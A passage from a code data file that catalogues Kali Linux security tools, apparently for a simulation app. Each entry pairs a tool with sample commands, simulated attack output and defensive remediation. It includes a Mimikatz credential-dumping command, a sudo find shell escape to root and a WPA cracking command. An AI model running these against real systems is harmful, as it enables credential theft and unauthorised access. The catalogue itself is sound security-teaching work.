      simulatedOutput: '[bettercap] SSLStrip intercepted connection from 192.168.1.52\nStripped HTTPS to HTTP for target domain\nCaptured POST credentials: { "user": "finance", "pin": "8412" }',
      defensiveRemediation: 'Submit domain to the HSTS preload list (hstspreload.org) and set max-age=63072000.'
    },
    supportedTargets: ['URL'],
    defaultArmed: false
  },

  // 8. REVERSE ENGINEERING
  {
    id: 'kali-ghidra',
    name: 'Ghidra (NSA Reverse Engineering)',
    binary: 'ghidra',
    category: 'Reverse Engineering',
    kaliPackage: 'ghidra',
    version: '11.0.1',
    description: 'Software reverse engineering (SRE) framework developed by the NSA Research Directorate including decompiler.',
    author: 'National Security Agency (NSA)',
    officialDocUrl: 'https://www.kali.org/tools/ghidra/',
    attackVectorsTested: [
      'Decompilation of compiled binaries (C, C++, Go, Rust)',
      'Hardcoded API keys and decryption keys in binary strings',
      'Buffer overflow and format string vulnerabilities',
      'Control flow graph analysis'
    ],
    sampleCommand: 'ghidraRun /path/to/binary',
    weaponizedPayload: 'Static disassembly and decompilation AST string search',
    exploitSimulation: {
      targetPattern: 'Hardcoded encryption keys or backend tokens in source code/binaries',
      triggerCondition: 'Secret constants embedded in code or application bundles',
      simulatedOutput: '[Ghidra Decompiler] Function: init_crypto_keys()\n0x004012a0: const char *ENCRYPTION_KEY = "3a9f029c71e8432a";\n[!] Symmetric master encryption key extracted from binary string table.',
      defensiveRemediation: 'Never compile symmetric secrets into client-side code or binaries. Use KMS / hardware security modules (HSM).'
    },
    supportedTargets: ['FILE', 'BINARY'],
    defaultArmed: true
  },
  {
    id: 'kali-apktool',
    name: 'Apktool',
    binary: 'apktool',
    category: 'Reverse Engineering',
    kaliPackage: 'apktool',
    version: '2.9.3',
    description: 'Tool for reverse engineering 3rd party, closed, binary Android apps into smali code and resources.',
    author: 'iBotPeaches & Connor Tumbleson',
    officialDocUrl: 'https://www.kali.org/tools/apktool/',
    attackVectorsTested: [
      'Android manifest security misconfigurations',
      'Exported activities and content providers without permissions',
      'android:allowBackup="true" vulnerabilities',
      'Hardcoded Firebase / AWS secrets in strings.xml'
    ],
    sampleCommand: 'apktool d app-release.apk -o decompiled_app',
    weaponizedPayload: 'Decompile APK and parse AndroidManifest.xml',
    exploitSimulation: {
      targetPattern: 'android:allowBackup="true" | android:debuggable="true"',
      triggerCondition: 'Debug flags or backup permission enabled in AndroidManifest.xml',
      simulatedOutput: '[Apktool] AndroidManifest.xml unpacked\n[!] CRITICAL: android:debuggable="true" permits arbitrary debugging and memory dumps.\n[!] android:allowBackup="true" allows ADB app data extraction.',
      defensiveRemediation: 'Set android:allowBackup="false" and ensure android:debuggable="false" for all production release variants.'
    },
    supportedTargets: ['FILE'],
    defaultArmed: true
  },

  // 9. WIRELESS ATTACKS
  {
    id: 'kali-aircrack-ng',
    name: 'Aircrack-ng Suite',
    binary: 'aircrack-ng',
    category: 'Wireless Attacks',
    kaliPackage: 'aircrack-ng',
    version: '1.7',
    description: 'Complete suite of tools to assess WiFi network security: monitoring, attacking, testing, and cracking WPA/WPA2/WEP.',
    author: 'Thomas d\'Otreppe',
    officialDocUrl: 'https://www.kali.org/tools/aircrack-ng/',
    attackVectorsTested: [
      'WPA/WPA2 4-way handshake capture and dictionary attack',
      'Deauthentication frames to disconnect clients',
      'WEP key recovery via IV injection',
      'Rogue AP / Evil Twin simulation'
    ],
    sampleCommand: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:14:6C:7E:40:80 capture.cap',
    weaponizedPayload: 'Deauthentication packet 802.11 broadcast frame to force handshake',
    exploitSimulation: {
      targetPattern: 'WPA2-PSK with short (<12 char) dictionary passphrase',
      triggerCondition: 'Pre-shared key susceptible to offline dictionary cracking',
      simulatedOutput: '[Aircrack-ng] Reading packets, please wait...\n1 potential targets detected\nKEY FOUND! [ CorporateWifi2023 ]',
      defensiveRemediation: 'Upgrade to WPA3-Enterprise or WPA2-Enterprise with 802.1X EAP-TLS certificate-based authentication.'
    },
    supportedTargets: ['PASSWORD', 'NETWORK'],
    defaultArmed: false
  },

  // 10. POST EXPLOITATION
  {
    id: 'kali-mimikatz',
    name: 'Mimikatz',
    binary: 'mimikatz',
    category: 'Post Exploitation',
    kaliPackage: 'mimikatz',
    version: '2.2.0',
    description: 'Extracts plaintexts passwords, hash, PIN code and kerberos tickets from memory (LSASS).',
    author: 'Benjamin Delpy (@gentilkiwi)',
    officialDocUrl: 'https://www.kali.org/tools/mimikatz/',
    attackVectorsTested: [
      'LSASS process memory scraping for cleartext credentials',
      'Pass-the-Hash / Pass-the-Ticket attacks',
      'Golden & Silver Kerberos ticket forging',
      'DPAPI master key recovery'
    ],
    sampleCommand: 'mimikatz # privilege::debug sekurlsa::logonpasswords',
    weaponizedPayload: 'Inject into lsass.exe and dump WDigest credentials',
    exploitSimulation: {
      targetPattern: 'WDigest enabled in Windows Registry (UseLogonCredential = 1)',
      triggerCondition: 'Cleartext credentials cached in LSASS process memory',
      simulatedOutput: 'Authentication Id : 0 ; 240899\nUser Name         : Administrator\nDomain            : CORP\nPassword          : MasterP@ssw0rd! (CLEARTEXT)',
      defensiveRemediation: 'Enable LSA Protection (RunAsPPL = 1), disable WDigest, and implement Credential Guard.'
    },
    supportedTargets: ['FILE'],
    defaultArmed: false
  },
  {
    id: 'kali-linpeas',
    name: 'LinPEAS (Privilege Escalation)',
    binary: 'linpeas.sh',
    category: 'Post Exploitation',
    kaliPackage: 'peass',
    version: '2024.03',
    description: 'Automated privilege escalation script that searches for possible paths to escalate privileges on Linux hosts.',
    author: 'Carlos Polop (@carlospolop)',
    officialDocUrl: 'https://www.kali.org/tools/peass/',
    attackVectorsTested: [
      'Writable /etc/passwd or /etc/shadow',
      'Dangerous SUID/SGID binaries (gtfobins)',
      'Sudo permissions with NOPASSWD',
      'Exposed plain text credentials in shell histories or cronjobs',
      'Vulnerable Linux kernel versions (Dirty COW, Dirty Pipe)'
    ],
    sampleCommand: './linpeas.sh -a',
    weaponizedPayload: 'Automated audit of Linux filesystem permissions and kernel symbols',
    exploitSimulation: {
      targetPattern: 'sudoers entry: developer ALL=(ALL) NOPASSWD: /usr/bin/find',
      triggerCondition: 'SUID or Sudo capability on binary with shell escape vector',
      simulatedOutput: '[!] RED/YELLOW: Sudo -l rights:\n(root) NOPASSWD: /usr/bin/find\nEscalation: sudo find . -exec /bin/sh \\; -quit -> ROOT SHELL!',
      defensiveRemediation: 'Review /etc/sudoers with least privilege; avoid granting root sudo to binaries capable of interactive subshell spawning.'
    },
    supportedTargets: ['FILE'],
    defaultArmed: true
  },

  // 11. FORENSICS
  {
    id: 'kali-binwalk',
    name: 'Binwalk',
    binary: 'binwalk',
    category: 'Forensics',
    kaliPackage: 'binwalk',
    version: '2.3.4',
    description: 'Fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images and files.',
    author: 'Craig Heffner',
    officialDocUrl: 'https://www.kali.org/tools/binwalk/',
    attackVectorsTested: [
      'Firmware image embedded file extraction',
      'Hidden archive decompression (zip, gzip, squashfs)',
      'Embedded private cryptographic keys detection',
      'Obfuscated payload carving'
    ],
    sampleCommand: 'binwalk -eM firmware.bin',
    weaponizedPayload: 'Signature-based magic byte scanning across raw byte stream',
    exploitSimulation: {
      targetPattern: 'Embedded private keys or secrets inside binary assets',
      triggerCondition: 'Firmware image bundling private key material',
      simulatedOutput: 'DECIMAL       HEXADECIMAL     DESCRIPTION\n1048576       0x100000        Squashfs filesystem, little endian\n1572864       0x180000        PEM RSA private key\n[!] Extracted root CA private key!',
      defensiveRemediation: 'Remove private keys from distributed device firmware. Provision unique keys per-device via HSM or TPM.'
    },
    supportedTargets: ['FILE'],
    defaultArmed: true
  },

  // 12. REPORTING TOOLS
  {
    id: 'kali-faraday',
    name: 'Faraday SEC',
    binary: 'faraday-server',
    category: 'Reporting Tools',
    kaliPackage: 'python3-faraday',
    version: '4.3.0',
    description: 'Collaborative penetration test and vulnerability management platform unifying data from 80+ security tools.',
    author: 'Faraday Security',
    officialDocUrl: 'https://www.kali.org/tools/faraday/',
    attackVectorsTested: [
      'Aggregated vulnerability deduplication',
      'CVSS 3.1 score normalization',
      'Jira / ticketing integration pipeline'
    ],
    sampleCommand: 'faraday-cli import --workspace audit nmap-output.xml',
    weaponizedPayload: 'XML / JSON vulnerability ingestion payload',
    exploitSimulation: {
      targetPattern: 'Multi-tool assessment findings consolidation',
      triggerCondition: 'Triaging findings from automated scanners',
      simulatedOutput: '[Faraday] Ingested 42 vulnerability items\nDeduplicated to 8 root-cause findings.\nExported executive compliance PDF.',
      defensiveRemediation: 'Maintain centralized vulnerability registers and enforce strict remediation SLAs.'
    },
    supportedTargets: ['FILE'],
    defaultArmed: false
  }
];
